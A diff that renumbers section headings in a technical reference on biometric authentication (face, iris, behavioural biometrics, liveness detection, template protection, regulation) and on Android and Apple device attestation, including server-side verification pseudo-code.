@@ -19268,7 +19270,7 @@ $$\text{sim}(\mathbf{e}_1, \mathbf{e}_2) = \frac{\mathbf{e}_1 \cdot \mathbf{e}_2
 
 where $\tau$ is the decision threshold. ArcFace (Deng et al., 2019), which adds an angular margin penalty to enforce intra-class compactness and inter-class separation, achieves 99.83% accuracy on the LFW benchmark at $\tau = 0.373$.
 
-##### 16.2.2 3D Structured Light (Apple Face ID)
+##### 17.2.2 3D Structured Light (Apple Face ID)
 
 Apple's Face ID — introduced with iPhone X (2017) and present on all Face ID-equipped iPhones, iPads, and the Vision Pro — uses the **TrueDepth camera system**, a dedicated sensor array that projects approximately **30,000 invisible near-infrared (NIR) dots** onto the user's face in a known pattern. A NIR camera captures the deformation of the dot pattern as it conforms to the facial surface, enabling the system to construct a precise **3D depth map** of the face.
 
@@ -19295,7 +19297,7 @@ Apple's Face ID — introduced with iPhone X (2017) and present on all Face ID-e
 
 **Anti-spoofing testing:** Apple has tested Face ID against custom-manufactured 3D masks created by professional special-effects studios and mask-making companies. The system resists these attacks because the depth map matching is sensitive to sub-millimetre surface geometry differences, material reflectance properties under NIR illumination, and the presence of living tissue characteristics (skin reflectance spectrum in NIR).
 
-##### 16.2.3 Infrared Camera (Windows Hello)
+##### 17.2.3 Infrared Camera (Windows Hello)
 
 Windows Hello facial recognition uses a **near-infrared (NIR) camera** paired with an IR illuminator to capture a face image that is robust to ambient lighting conditions. Unlike Apple's structured light approach (which projects a dot pattern and measures deformation), Windows Hello's IR approach captures a standard 2D image — but in the near-infrared spectrum rather than visible light.
 
@@ -19311,7 +19313,7 @@ Windows Hello facial recognition uses a **near-infrared (NIR) camera** paired wi
 #### 17.3 Iris Scanning
 Iris recognition exploits the complex, random texture of the iris — the coloured muscular ring surrounding the pupil. The iris stroma contains a unique pattern of crypts, furrows, freckles, and collarette features that forms during foetal development and remains stable throughout life (barring injury or disease). Iris patterns are statistically independent even between the two eyes of the same individual, and between identical twins.
 
-##### 16.3.1 Capture and Encoding (Daugman's Algorithm)
+##### 17.3.1 Capture and Encoding (Daugman's Algorithm)
 
 ```mermaid
 flowchart LR
@@ -19379,7 +19381,7 @@ The expected HD for different irises is ~0.5 (random); for the same iris, ~0.08�
 
 </details>
 
-##### 16.3.2 Performance and Deployment
+##### 17.3.2 Performance and Deployment
 
 Iris recognition achieves theoretical false match rates that far exceed any other biometric modality. Daugman's published research, based on over 200 billion cross-comparisons, demonstrated a false match rate of less than **1 in 200 billion** at a Hamming distance threshold of 0.26 — a level of discriminative power unmatched by fingerprint, face, or any other biometric.
 
@@ -19389,7 +19391,7 @@ Iris recognition achieves theoretical false match rates that far exceed any othe
 - **UAE immigration** — iris recognition at border control gates for automated entry/exit processing
 - **Samsung Galaxy S8/S9** — Samsung implemented iris scanning in its flagship smartphones (2017–2018). The feature was **discontinued after the Galaxy S9/Note 9** generation due to poor UX (required specific eye positioning and holding the phone at a precise distance), slow capture compared to fingerprint, failure in bright sunlight (ambient NIR saturated the sensor), and the competitive superiority of under-display fingerprint sensors and 3D facial recognition for mobile use
 
-##### 16.3.3 Standard Compliance
+##### 17.3.3 Standard Compliance
 
 **ISO/IEC 19794-6 — Iris Image Data:** Defines the standardised data format for iris image records, including cropped iris images and rectilinear (unwrapped) iris images. Used in e-passports (ICAO Doc 9303 — iris is one of the three ICAO-standardised biometric modalities alongside face and fingerprint), border control systems, and government identity programmes.
 
@@ -19475,7 +19477,7 @@ flowchart TD
     style K2 text-align:left
 ```
 
-##### 16.5.1 Independent Binding (OR Logic)
+##### 17.5.1 Independent Binding (OR Logic)
 
 In independent binding, each biometric modality independently unlocks the same key — the user can authenticate with fingerprint **OR** face. The key has a single access policy that accepts any registered modality that meets the required biometric strength class. This is the **dominant model** on both iOS and Android.
 
@@ -19485,7 +19487,7 @@ In independent binding, each biometric modality independently unlocks the same k
 
 **Implication:** Independent binding maximises usability — the user always has a fallback modality if one fails (e.g., wet fingers → use face). The security posture is determined by the **weakest** accepted modality — if face recognition is Class 2 but fingerprint is Class 3, and the key accepts either, the effective security is Class 2.
 
-##### 16.5.2 Combined Binding (AND Logic)
+##### 17.5.2 Combined Binding (AND Logic)
 
 Combined binding requires **multiple biometric modalities to be presented** — fingerprint **AND** face — before a key is unlocked. This significantly increases security (an attacker must defeat both modalities simultaneously) but is rarely implemented in consumer products due to the UX friction of requiring two separate biometric presentations.
 
@@ -19496,7 +19498,7 @@ Combined binding requires **multiple biometric modalities to be presented** — 
 
 Neither iOS nor Android provides a public API for combined biometric binding — the platform APIs treat all biometric modalities as interchangeable under a single access policy.
 
-##### 16.5.3 Score-Level Fusion
+##### 17.5.3 Score-Level Fusion
 
 Score-level fusion combines match scores from multiple modalities to improve overall accuracy without requiring explicit AND logic. A decision engine receives the match score from each modality (e.g., fingerprint match score = 0.87, face match score = 0.92) and applies a fusion rule to produce a combined score. Given $K$ modalities producing normalised matching scores $s_1, s_2, \ldots, s_K$ (higher = more similar), the principal fusion rules are:
 
@@ -19512,11 +19514,11 @@ NIST multi-modal biometric fusion studies demonstrate that score-level fusion ca
 
 Score-level fusion is primarily deployed in enterprise access control systems and government biometric verification programmes — not in consumer mobile platforms, which use the simpler independent binding model.
 
-##### 16.5.4 Template-Level Independence
+##### 17.5.4 Template-Level Independence
 
 Even in independent binding, each modality's template is stored separately — the fingerprint template and face template are **distinct objects** in the Secure Enclave or TEE/StrongBox. Enrolling a new fingerprint does not modify or invalidate the face template, and vice versa. The independence applies at the template layer; the key access policy operates at a higher abstraction level, accepting authentication from any enrolled modality that satisfies the policy constraints.
 
-##### 16.5.5 ROC Analysis and NIST Evaluation
+##### 17.5.5 ROC Analysis and NIST Evaluation
 
 The performance of a fused biometric system is characterised by its Receiver Operating Characteristic (ROC) curve — a plot of False Match Rate (FMR) against False Non-Match Rate (FNMR) as the fusion threshold varies. A fundamental result from signal detection theory states that the area under the ROC curve (AUC) for a fused system is always at least as large as the AUC of any individual modality, provided the modalities are not perfectly correlated:
 
@@ -19530,7 +19532,7 @@ In practice, correlations between modalities (e.g., a user with poor fingerprint
 #### 17.6 Modality-Agnostic Platforms: When the OS Hides Which Modality Was Used
 Both iOS and Android present a **modality-agnostic authentication API** to applications. The application requests "authenticate the user" and the operating system determines which biometric modality to invoke based on device capabilities, user enrollment state, and sensor availability. The application receives a binary success/failure result (and, in the case of key-bound authentication, a cryptographic operation result) — it does **not** receive information about which specific biometric modality performed the authentication.
 
-##### 16.6.1 iOS: LocalAuthentication Framework
+##### 17.6.1 iOS: LocalAuthentication Framework
 
 The iOS `LAContext` API provides two authentication policies:
 
@@ -19557,7 +19559,7 @@ context.evaluatePolicy(
 
 The application can query `context.biometryType` to determine which biometric modality is **available** on the device (`LABiometryType.faceID`, `.touchID`, or `.none`) — this is useful for displaying the correct icon and instructional text in the UI. However, this only reveals the device's hardware capability, not which modality was actually used for a specific authentication event. On devices with a single biometric modality (all current iPhones have Face ID; only older iPhones and some iPads have Touch ID), this distinction is academic — but it becomes relevant on iPad models that support both.
 
-##### 16.6.2 Android: BiometricPrompt
+##### 17.6.2 Android: BiometricPrompt
 
 Android's `BiometricPrompt` API (introduced in Android 9, Pie) provides a system-managed authentication dialog that is consistent across all Android devices:
 
@@ -19578,7 +19580,7 @@ The application specifies the **minimum strength class** (`BIOMETRIC_STRONG`, `B
 
 **Key property:** The `CryptoObject` parameter binds the biometric authentication to a specific cryptographic operation — the application presents a `Cipher`, `Signature`, or `Mac` object initialised with a hardware-backed key. A successful biometric authentication unlocks the key within the TEE/StrongBox, and the cryptographic operation completes within the hardware security boundary. Without the `CryptoObject`, the biometric authentication provides only a boolean result with no cryptographic binding — the app must trust the OS-level signal, which is weaker than a hardware-attested cryptographic proof. For the complete FIDO2/WebAuthn biometric authentication protocol sequence diagram (registration, attestation, and challenge-response signing), see §18.
 
-##### 16.6.3 Why Modality-Agnostic Design
+##### 17.6.3 Why Modality-Agnostic Design
 
 The modality-agnostic approach serves three design goals:
 
@@ -19591,7 +19593,7 @@ The modality-agnostic approach serves three design goals:
 #### 17.7 Modality-Specific Binding: Per-Biometric Key Protection
 Some high-security use cases contemplate binding a cryptographic key to a **specific biometric modality** — not merely "any biometric" but "specifically fingerprint" or "specifically face." The motivation is regulatory and risk-management driven: if a user enrolled with their fingerprint for a high-value transaction signing key, the institution may require that the same modality (fingerprint) be used for every subsequent authentication — not an alternative modality that may have different security properties.
 
-##### 16.7.1 Current Platform Capabilities
+##### 17.7.1 Current Platform Capabilities
 
 Neither iOS nor Android provides a public API to bind a key exclusively to a specific biometric modality:
 
@@ -19604,7 +19606,7 @@ Neither iOS nor Android provides a public API to bind a key exclusively to a spe
 
 **The gap:** No standard platform API allows an application to specify "this key can only be unlocked by fingerprint, not by face" or "this key requires iris, not fingerprint." The platform treats all enrolled biometrics of the required strength class as interchangeable.
 
-##### 16.7.2 Regulatory Interpretation (PSD2)
+##### 17.7.2 Regulatory Interpretation (PSD2)
 
 PSD2 RTS (Delegated Regulation (EU) 2018/389) Article 4 requires that the authentication elements used for Strong Customer Authentication (SCA) satisfy three categories: knowledge, possession, and inherence. Article 8 requires that the personalised security credentials used during dynamic linking (transaction signing) be specific to the amount and payee.
 
@@ -19633,7 +19635,7 @@ This section provides a deep feature comparison of the two dominant platform bio
 #### 17.9 Liveness Detection and Presentation Attack Detection (PAD)
 Presentation attacks attempt to deceive a biometric sensor by presenting a non-live biometric artifact — a photograph, silicone fingerprint mold, 3D-printed mask, video replay, or deepfake-generated video. **Presentation Attack Detection (PAD)** systems distinguish live biometric presentations from artificial artifacts, and ISO/IEC 30107 provides the standardised framework for evaluating PAD effectiveness.
 
-##### 16.9.1 ISO/IEC 30107 Framework
+##### 17.9.1 ISO/IEC 30107 Framework
 
 ISO/IEC 30107 (parts 1–4) defines the vocabulary, testing methodology, and reporting format for Presentation Attack Detection. The standard introduces key concepts:
 
@@ -19709,7 +19711,7 @@ flowchart TD
     I -->|Correct Accept| M
 ```
 
-##### 16.9.2 PAI Levels
+##### 17.9.2 PAI Levels
 
 PAIs are categorised by attacker sophistication into three levels, guiding the testing regime:
 
@@ -19722,7 +19724,7 @@ PAIs are categorised by attacker sophistication into three levels, guiding the t
 
 The Android CDD Class 3 biometric certification requires testing against **Level A and Level B PAIs** with a Spoof Acceptance Rate (SAR) below 7% for Level A and below 20% for Level B. Apple's internal Face ID testing programme includes Level C-equivalent artefacts — professionally manufactured masks — though Apple does not publish certification against external PAI level standards.
 
-##### 16.9.3 Fingerprint Liveness Detection
+##### 17.9.3 Fingerprint Liveness Detection
 
 | Technique | Mechanism | Effectiveness |
 |:----------|:---------|:-------------|
@@ -19733,7 +19735,7 @@ The Android CDD Class 3 biometric certification requires testing against **Level
 | **Software-based (AI/ML)** | Deep learning models trained on live vs. spoof fingerprint images, applied to the sensor's raw output | Moderate — effectiveness depends on training data diversity and the sophistication of novel attack materials |
 | **Oximetry-based** | Measures blood oxygen saturation (SpO₂) via optical transmittance at two wavelengths — dead tissue or synthetic materials lack real oxygenated haemoglobin absorption | Effective against Level A–C artefacts; adds modest sensor complexity |
 
-##### 16.9.4 Facial Liveness Detection
+##### 17.9.4 Facial Liveness Detection
 
 | Technique | Mechanism | Effectiveness |
 |:----------|:---------|:-------------|
@@ -19743,7 +19745,7 @@ The Android CDD Class 3 biometric certification requires testing against **Level
 | **Infrared analysis** | Capturing the face under NIR illumination — live skin has specific reflectance properties in the 700–900nm range; screens (which emit visible light but not NIR) and photographs (which absorb/reflect NIR differently) produce anomalous signatures | Effective when paired with dedicated NIR illuminator (Face ID, Windows Hello) |
 | **rPPG (remote photoplethysmography)** | Extracts heart rate and blood volume pulse from subtle skin colour variations caused by blood flow — synthetic media lacks these micro-changes | Promising research direction; requires multi-frame analysis and controlled lighting conditions |
 
-##### 16.9.5 The Deepfake Threat
+##### 17.9.5 The Deepfake Threat
 
 Generative AI has fundamentally changed the threat landscape for video-based facial liveness detection. Real-time deepfake systems can generate convincing facial animations that respond to challenge-response prompts (blink, turn head, speak) with sub-second latency. This renders **active liveness checks that rely on 2D camera data increasingly unreliable**:
 
@@ -19764,7 +19766,7 @@ Generative AI has fundamentally changed the threat landscape for video-based fac
 | **Physiological signal verification** | rPPG, micro-expressions, and pupil dynamics are difficult for generative models to synthesise consistently across frames | Requires multi-frame analysis window |
 | **Frequency domain analysis** | GAN-generated faces exhibit characteristic frequency spectrum artefacts | Adversarial training can overcome this detection method |
 
-##### 16.9.6 Emerging Modalities and Future Directions
+##### 17.9.6 Emerging Modalities and Future Directions
 
 Several technologies may further expand the biometric authentication landscape in the 2027–2030 timeframe:
 
@@ -19779,7 +19781,7 @@ Several technologies may further expand the biometric authentication landscape i
 #### 17.10 Behavioural Biometrics (Continuous Authentication)
 Behavioural biometrics authenticate users based on **how they interact with a device** rather than physiological characteristics. Unlike fingerprint, face, or iris — which provide a point-in-time positive identification — behavioural biometrics operate as a **continuous signal** that monitors interaction patterns throughout a session to detect anomalies.
 
-##### 16.10.1 Modalities
+##### 17.10.1 Modalities
 
 | Modality | Measured Characteristics | Sensors | Accuracy (EER) | Spoofing Resistance | User Acceptance |
 |:---------|:------------------------|:--------|:--------------|:-------------------|:----------------|
@@ -19790,7 +19792,7 @@ Behavioural biometrics authenticate users based on **how they interact with a de
 | **Device interaction patterns** | App usage sequences, typical session durations, navigation patterns, time-of-day usage profiles, Wi-Fi/cell tower location consistency | OS-level analytics, network metadata | 10–15% | Low (easily observed) | Low (privacy concern) |
 | **Scroll behaviour** | Scroll speed, direction, content dwell | Touchscreen/trackpad | 8–12% | Low | High |
 
-##### 16.10.2 Use Case: Continuous Risk Scoring
+##### 17.10.2 Use Case: Continuous Risk Scoring
 
 Behavioural biometrics are **not used as a primary authentication factor** — their error rates are too high and too variable for positive identification. Instead, they serve as a **continuous risk signal** within an adaptive authentication framework (§25):
 
@@ -19821,7 +19823,7 @@ $$R_{\text{behavioral}} = 1 - F_{\chi^2_p}(D_M^2)$$
 
 where $F_{\chi^2_p}$ is the cumulative distribution function of the chi-squared distribution. This formulation has the advantage of naturally handling features with different units and scales (e.g., keystroke latency in milliseconds vs mouse velocity in pixels/second) by normalising through the covariance matrix — features that are highly variable receive lower weight, while features that are stable for a given user contribute more to the distance.
 
-##### 16.10.3 Accuracy Limitations
+##### 17.10.3 Accuracy Limitations
 
 Behavioural biometrics have **significantly higher error rates** than physiological biometrics:
 
@@ -19842,7 +19844,7 @@ $$\boldsymbol{\mu}_{t+1} = \alpha \cdot \boldsymbol{\mu}_t + (1 - \alpha) \cdot 
 
 where $\alpha$ controls the adaptation rate (typical values: 0.95–0.99, favouring stability over responsiveness). Profiles may also need to be segmented by context — focused work sessions, casual browsing, and mobile usage exhibit different behavioural signatures.
 
-##### 16.10.4 Privacy Considerations
+##### 17.10.4 Privacy Considerations
 
 Continuous behavioural monitoring raises significant privacy concerns — the system is effectively a **keylogger and interaction tracker** that records detailed information about every user interaction:
 
@@ -19851,7 +19853,7 @@ Continuous behavioural monitoring raises significant privacy concerns — the sy
 - **Data minimisation:** The system must collect only the minimum behavioural data necessary for the risk assessment purpose and must not retain raw interaction data beyond the period required for profile maintenance
 - **Transparency:** Users must be informed that behavioural biometric monitoring is active, what data is collected, how it is used, and how to exercise their data subject rights (access, erasure, objection)
 
-##### 16.10.5 Commercial Implementations
+##### 17.10.5 Commercial Implementations
 
 | Vendor | Product | Primary Market | Approach |
 |:-------|:--------|:--------------|:---------|
@@ -19904,7 +19906,7 @@ flowchart LR
 
 The irrevocability of biometric traits (§17 preamble) creates a fundamental template security problem: if a biometric template database is compromised, every enrolled user is permanently affected. Standard cryptographic protections are inadequate — **hashing fails** because the same user's biometric produces a different hash at each capture (intra-class variability), and **encryption** hides the template only until decryption, at which point it is exposed in plaintext for comparison.
 
-##### 16.11.1 The Template Protection Problem
+##### 17.11.1 The Template Protection Problem
 
 Template protection schemes must satisfy four requirements (ISO/IEC 30107 conceptual framework):
 
@@ -19913,7 +19915,7 @@ Template protection schemes must satisfy four requirements (ISO/IEC 30107 concep
 3. **Non-invertibility** — it is computationally infeasible to recover the original biometric from the protected template
 4. **Performance** — the protected scheme does not significantly degrade recognition accuracy
 
-##### 16.11.2 Cancelable Biometrics
+##### 17.11.2 Cancelable Biometrics
 
 Cancelable biometrics apply an intentional, non-invertible transformation to the raw biometric feature vector before template storage. The transformation is parameterised by a user-specific or application-specific key, enabling revocation by changing the key.
 
@@ -19921,7 +19923,7 @@ Cancelable biometrics apply an intentional, non-invertible transformation to the
 
 **BioEncoding** (Jin et al., 2012) uses a set of random convex polyhedra in feature space. The user's feature vector is encoded based on which polyhedron it falls within, providing error tolerance without sacrificing non-invertibility.
 
-##### 16.11.3 Fuzzy Extractors
+##### 17.11.3 Fuzzy Extractors
 
 Fuzzy extractors (Dodis et al., 2004) provide a cryptographic framework that tolerates the noise inherent in biometric samples. A fuzzy extractor consists of two procedures:
 
@@ -19930,7 +19932,7 @@ Fuzzy extractors (Dodis et al., 2004) provide a cryptographic framework that tol
 
 The security requirement is that $P$ reveals nothing about $R$ (information-theoretic secrecy), while correctness guarantees that if the Hamming distance $\text{dis}(\mathbf{w}, \mathbf{w}') \leq t$ for error tolerance $t$, then $\text{Rep}(\mathbf{w}', P) = R$. The standard **code-offset construction** uses an error-correcting code (BCH or Reed-Solomon) to absorb the biometric noise: the helper string stores $P = \mathbf{w} \oplus \text{Enc}(\mathbf{s})$, and reproduction decodes $\text{Dec}(P \oplus \mathbf{w}')$ to recover the secret $\mathbf{s}$.
 
-##### 16.11.4 Homomorphic Encryption for Matching
+##### 17.11.4 Homomorphic Encryption for Matching
 
 Homomorphic encryption enables biometric comparison on encrypted data without decryption — the server can match an encrypted query template against an encrypted enrolled template and obtain an encrypted similarity score, without ever seeing either template in plaintext:
 
@@ -19938,7 +19940,7 @@ $$\text{Match}(\text{Enc}(T_{\text{enrolled}}), \text{Enc}(T_{\text{query}})) \t
 
 The Paillier cryptosystem supports additive homomorphism ($\text{Enc}(a) \cdot \text{Enc}(b) = \text{Enc}(a + b)$), enabling Hamming distance computation on encrypted IrisCodes. However, homomorphic encryption is **100–10,000× slower** than plaintext comparison, making it practical for server-side template protection in high-assurance environments (government identity programmes, border control) but impractical for real-time device-side authentication.
 
-##### 16.11.5 Privacy Compliance
+##### 17.11.5 Privacy Compliance
 
 The GDPR classifies biometric data as a **special category of personal data** under Article 9(1). The relevant derogations for biometric authentication systems are:
 
@@ -19954,7 +19956,7 @@ Key requirements for biometric template systems: **data minimisation** (store te
 #### 17.12 Regulatory Landscape
 Biometric authentication is subject to a fragmented and evolving regulatory environment that varies significantly by jurisdiction. The following sections cover the most consequential regulatory frameworks for biometric system deployment.
 
-##### 16.12.1 PSD2 Strong Customer Authentication
+##### 17.12.1 PSD2 Strong Customer Authentication
 
 The Payment Services Directive 2 (PSD2) — Directive (EU) 2015/2366 — and its Regulatory Technical Standards (RTS), Delegated Regulation (EU) 2018/389, establish biometric requirements for payment authentication in the European Economic Area. Article 4 of the RTS requires that Strong Customer Authentication (SCA) combine two or more elements from the categories knowledge, possession, and inherence — biometric authentication qualifies as the inherence element.
 
@@ -19965,14 +19967,14 @@ Key requirements affecting biometric deployment:
 
 The regulatory question of whether switching biometric modalities (e.g., from fingerprint to face on a multi-modal device) constitutes a change in the inherence factor is addressed in §17.7.2.
 
-##### 16.12.2 eIDAS Biometric Standards
+##### 17.12.2 eIDAS Biometric Standards
 
 The eIDAS Regulation ((EU) 910/2014) defines electronic identification and trust services standards for the EU. For biometric authentication, the relevant assurance levels are:
 
 - **Substantial LoA**: requires multi-factor authentication. Biometrics may serve as one factor but must be combined with a possession or knowledge factor. Conformance to EN 319 412-1 (eIDAS authentication framework) is expected
 - **High LoA**: requires multi-factor authentication with hardware-bound keys. Biometric templates must be stored in hardware security modules (TEE, SE, TPM) and never transmitted to the server. The biometric serves as a local unlocking mechanism for a hardware-bound cryptographic credential
 
-##### 16.12.3 US State Biometric Privacy Laws
+##### 17.12.3 US State Biometric Privacy Laws
 
 The United States lacks a federal biometric privacy law, but several states have enacted comprehensive legislation:
 
@@ -19985,7 +19987,7 @@ The United States lacks a federal biometric privacy law, but several states have
 
 BIPA is the most consequential due to its broad private right of action and the absence of an injury-in-fact requirement. Since the Illinois Supreme Court's *Rosenbach v. Six Flags* (2019) decision, plaintiffs need not demonstrate actual harm — a technical violation of the consent or retention provisions is sufficient. BIPA litigation has generated billions of dollars in settlements, making compliance a critical consideration for any organisation deploying biometric authentication in Illinois.
 
-##### 16.12.4 India: DPDP Act 2023
+##### 17.12.4 India: DPDP Act 2023
 
 India's Digital Personal Data Protection Act 2023 (DPDP Act) introduces consent-based data protection with specific implications for biometric systems. Key provisions:
 
@@ -19995,12 +19997,12 @@ India's Digital Personal Data Protection Act 2023 (DPDP Act) introduces consent-
 - **Aadhaar context**: the Supreme Court of India's *K.S. Puttaswamy v. Union of India* (2017) judgement affirmed privacy as a fundamental right and imposed proportionality requirements on Aadhaar-based biometric authentication. Subsequent amendments and the DPDP Act 2023 constrain mandatory Aadhaar-linking for private services while preserving its use for government welfare programmes and Know Your Customer (KYC) verification in financial services
 
 
-#### 17.11 Continuous Authentication and Behavioral Biometrics
+#### 17.13 Continuous Authentication and Behavioral Biometrics
 DR-0003's §17 covers biometric authentication modalities, including physiological biometrics (fingerprint, facial recognition, iris scan). This section extends that coverage with **behavioral biometrics** — the analysis of user behavior patterns (typing rhythm, mouse movement, gait, touchscreen interaction) for continuous, implicit authentication.
 
 Continuous authentication is not a one-time event (like a fingerprint scan) but an ongoing process: the system continuously monitors the user's behavior during a session and raises a risk score based on how closely the observed behavior matches the enrolled profile. If the risk score exceeds a threshold, the system triggers step-up authentication (re-authentication with a stronger factor).
 
-##### 16.11.1 Behavioral Biometrics Modalities
+##### 17.13.1 Behavioral Biometrics Modalities
 
 **Keystroke dynamics.** Each person has a characteristic typing pattern: the time between successive keystrokes (digraph latency), the duration of individual key presses (dwell time), and the tendency to use specific fingers for specific keys. Keystroke dynamics can be captured without any additional hardware — the operating system or browser already records keystroke timing for input buffering.
 
@@ -20015,7 +20017,7 @@ Continuous authentication is not a one-time event (like a fingerprint scan) but 
 
 **Gait analysis.** For mobile devices carried in a pocket or worn on the wrist, gait (walking pattern) can be analyzed using the accelerometer and gyroscope. Gait is a strong biometric — difficult to spoof remotely — but is only available when the user is walking, not when stationary.
 
-##### 16.11.2 Architecture
+##### 17.13.2 Architecture
 
 A continuous authentication system has three components:
 
@@ -20029,7 +20031,7 @@ A continuous authentication system has three components:
    - Score > 0.7: High risk. Trigger step-up authentication (re-authenticate with WebAuthn, OTP, or password).
    - Score > 0.9: Critical risk. Terminate session, require full re-authentication.
 
-##### 16.11.3 Privacy and Compliance
+##### 17.13.3 Privacy and Compliance
 
 Behavioral biometrics collect detailed information about how users interact with their devices. This raises privacy concerns:
 
@@ -20067,7 +20069,7 @@ Each type has different granularity, privacy implications, and implementation co
 #### 18.1 Android Key Attestation
 Android Key Attestation allows a server to cryptographically verify that a key pair was generated inside the device's hardware security module (TEE or StrongBox) and to inspect the properties of both the key and the device at the time of key generation. The attestation mechanism is built into the Android Keystore system and is available on all devices running Android 8.0 (API level 26) and above with hardware-backed key storage.
 
-##### 17.1.1 Attestation Certificate Chain
+##### 18.1.1 Attestation Certificate Chain
 
 When an application generates a key pair in the Android Keystore with attestation enabled, the Keystore returns not just the public key but a **certificate chain** — typically three or four X.509 certificates:
 
@@ -20435,7 +20437,7 @@ Chain: [3 certificates]
 
 
 
-##### 17.1.2 Attestation Extension: OID 1.3.6.1.4.1.11129.2.1.17
+##### 18.1.2 Attestation Extension: OID 1.3.6.1.4.1.11129.2.1.17
 
 The key attestation certificate (Certificate 0 in the chain) contains a custom X.509 extension identified by OID `1.3.6.1.4.1.11129.2.1.17`. This extension is DER-encoded and contains a `KeyDescription` ASN.1 structure with the following fields:
 
@@ -20545,7 +20547,7 @@ This complete schema includes all `AuthorizationList` tags (including the ID att
 
 </details>
 
-##### 17.1.2.1 AuthorizationList Verification Reference
+##### 18.1.2.1 AuthorizationList Verification Reference
 
 Every tag in the `AuthorizationList` carries specific security semantics. The following table provides a complete reference for server-side verification (Android Key Attestation, Android Developers):
 
@@ -20605,7 +20607,7 @@ flowchart LR
 
 Fields present in `teeEnforced` (or `StrongBox-enforced`) are guaranteed by hardware. Fields present in `softwareEnforced` are asserted by the Android OS and can be forged by a rooted device — a prudent verifier should trust only `teeEnforced` fields for security decisions. The ID attestation fields (`attestationIdBrand` through `attestationIdModel`, tags [710]–[717]) contain device-identifying information and are populated only when the calling app holds the device owner privilege; RPs should avoid persisting these values due to privacy implications.
 
-##### 17.1.2.2 Server-Side Verification Algorithm
+##### 18.1.2.2 Server-Side Verification Algorithm
 
 The following pseudo-code outlines the complete verification process for Android key attestation. RPs should implement this as a dedicated verification service (Android Key Attestation, Android Developers) rather than inlining validation in business logic:
 
@@ -20667,7 +20669,7 @@ function verifyAndroidKeyAttestation(certChain, challenge, expectedAppPackage):
 
 Key design decisions in this algorithm: the challenge nonce (step 3) must be generated fresh per attestation request and bound to the user session; the `teeEnforced` list is checked exclusively (step 6) because `softwareEnforced` values are forgeable on rooted devices; and the CRL check (step 10) should be performed against Google's attestation CRL to catch certificates revoked after a TEE or SE vulnerability disclosure.
 
-##### 17.1.3 Security Levels
+##### 18.1.3 Security Levels
 
 The `attestationSecurityLevel` and `keyMintSecurityLevel` fields classify the hardware boundary protecting the attestation and key operations:
 
@@ -20679,7 +20681,7 @@ The `attestationSecurityLevel` and `keyMintSecurityLevel` fields classify the ha
 
 **RP enforcement strategy:** High-assurance RPs (banking, government identity) should require `attestationSecurityLevel >= TrustedEnvironment` and `origin == GENERATED` in the `hardwareEnforced` list. For maximum assurance, require `StrongBox` — though this excludes devices without a dedicated SE chip.
 
-##### 17.1.4 Key Attestation vs. ID Attestation
+##### 18.1.4 Key Attestation vs. ID Attestation
 
 Android supports two distinct attestation mechanisms:
 
@@ -20689,7 +20691,7 @@ Android supports two distinct attestation mechanisms:
 
 ID attestation fields appear in the `AuthorizationList` as `deviceBrand`, `deviceModel`, `deviceProduct`, `serialNumber`, `imei`, and `meid` — but only when the calling app has the device owner privilege. This restriction prevents consumer apps from using attestation as a device fingerprinting mechanism.
 
-##### 17.1.5 Provisioned Attestation Key Revocation
+##### 18.1.5 Provisioned Attestation Key Revocation
 
 When a TEE or SE vulnerability is discovered that could allow attestation key extraction, Google revokes the affected attestation keys by adding them to the public attestation certificate revocation status database. Google distributes revocation information through:
 
@@ -20749,7 +20751,7 @@ flowchart TD
     style DC3 text-align:left
 ```
 
-##### 17.2.1 App Attest (iOS 14+)
+##### 18.2.1 App Attest (iOS 14+)
 
 App Attest allows an app to generate a cryptographic key pair inside the Secure Enclave and have Apple certify that the key was generated on a genuine Apple device running an unmodified copy of the app. The attestation is bound to the specific app identity (`teamID.bundleID`), creating a cryptographic link between the device, the app binary, and the key.
 
@@ -20838,7 +20840,7 @@ flowchart LR
 
 **Nonce binding (OID 1.2.840.113635.100.8.2):** The critical security binding in App Attest is the nonce extension in the leaf attestation certificate. The nonce prevents replay attacks (captured attestation objects cannot be reused against a different server nonce), cross-app attacks (an attestation obtained for App A cannot be submitted to App B), and pre-computed attestation attacks (the server must generate a fresh nonce for each attestation request). Best practices: use a **cryptographically random** nonce of at least 32 bytes, bind the nonce to the **user session** (include the session ID in the nonce or store a nonce-to-session mapping server-side), and set a **short TTL** (e.g., 5 minutes) for unused nonces (App Attest, Apple Developer Documentation).
 
-##### 17.2.2 App Attest Assertions
+##### 18.2.2 App Attest Assertions
 
 After the initial attestation, the app uses the attested key to **sign assertions** — cryptographic proofs that specific requests originated from the attested device/app pair:
 
@@ -21088,7 +21090,7 @@ Content-Type: application/json
 
 
 
-##### 17.2.2.1 Server-Side App Attest Verification
+##### 18.2.2.1 Server-Side App Attest Verification
 
 The relying party server must perform the following checks when receiving an App Attest attestation (App Attest, Apple Developer Documentation):
 
@@ -21133,7 +21135,7 @@ function verifyAppleAppAttest(attestationObj, clientChallenge, expectedTeamId, e
 
 Key implementation notes: the `clientData` hash (step 6) is computed as `SHA-256(clientChallenge)`, not as the raw challenge bytes; the `receipt` field in `attStmt` serves as the attestation signature; and the team ID is verified against OID `1.2.840.113635.100.6.11.1` in the leaf certificate's Organizational Unit field, while the bundle ID is verified against the Common Name.
 
-##### 17.2.3 DeviceCheck (iOS 11+)
+##### 18.2.3 DeviceCheck (iOS 11+)
 
 DeviceCheck is a simpler, non-cryptographic mechanism that allows a server to associate **two bits of persistent state** with each device, per developer. Unlike App Attest, DeviceCheck does not provide cryptographic proof of device authenticity — it provides a device uniqueness signal.
 
@@ -21163,7 +21165,7 @@ The server sends the device token to Apple's DeviceCheck API (`https://api.devic
 
 DeviceCheck bits persist across app reinstallation and device reset (they are tied to the hardware, not the app installation). This makes DeviceCheck effective for preventing account fraud — a device flagged as fraudulent remains flagged even after a factory reset and fresh app install.
 
-##### 17.2.4 App Attest vs. DeviceCheck Comparison
+##### 18.2.4 App Attest vs. DeviceCheck Comparison
 
 | Feature | App Attest | DeviceCheck |
 |:--------|:-----------|:------------|
@@ -21212,7 +21214,7 @@ flowchart LR
     style Quote text-align:left
 ```
 
-##### 17.3.1 Platform Attestation: Remote Attestation via TPM2_Quote
+##### 18.3.1 Platform Attestation: Remote Attestation via TPM2_Quote
 
 Platform attestation — also called **remote attestation** — allows a verifier to obtain cryptographic proof of the device's current software state. The TPM produces a signed statement of its Platform Configuration Register (PCR) values, which encode the measurements of every component loaded during the device's boot process (§15.2.3 for PCR definitions).
 
@@ -21269,7 +21271,7 @@ where $s_0, s_1, \ldots, s_n$ are the selected PCR indices and $H$ is the hash a
